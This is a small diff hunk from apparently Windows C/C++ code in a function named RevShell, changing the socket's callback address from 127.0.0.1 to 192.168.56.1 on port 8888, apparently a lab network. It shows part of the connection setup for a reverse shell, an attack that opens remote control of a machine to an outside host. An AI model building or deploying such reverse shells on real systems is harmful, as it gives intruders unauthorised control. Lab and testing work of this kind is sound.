@@ -56,7 +56,7 @@ void RevShell() {
 
 	SOCKET tcpSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	SOCKADDR_IN sock_addr;
-	sock_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	sock_addr.sin_addr.s_addr = inet_addr("192.168.56.1");
 	sock_addr.sin_family = AF_INET;
 	sock_addr.sin_port = htons(8888);
 
